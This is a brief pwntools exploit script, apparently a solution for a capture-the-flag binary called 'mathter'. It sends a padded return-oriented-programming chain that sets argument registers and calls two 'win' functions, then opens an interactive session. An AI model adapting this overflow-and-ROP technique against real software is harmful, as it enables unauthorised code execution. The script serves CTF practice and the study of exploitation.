from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']

#r = process('../chal/share/mathter')
r = remote('127.0.0.1', 50001)
win1 = 0x4018c5
win2 = 0x401997
ret = 0x401016
pop_rdi = 0x402540

r.sendlineafter(b':', b'q')
p = flat(
    b'a'*12,
    pop_rdi,
    0xdeadbeef,
    ret,
    win1,
    pop_rdi,
    0xcafebabe,
    ret,
    win2
)

r.recvuntil(b']')
r.sendline(p)


r.interactive()
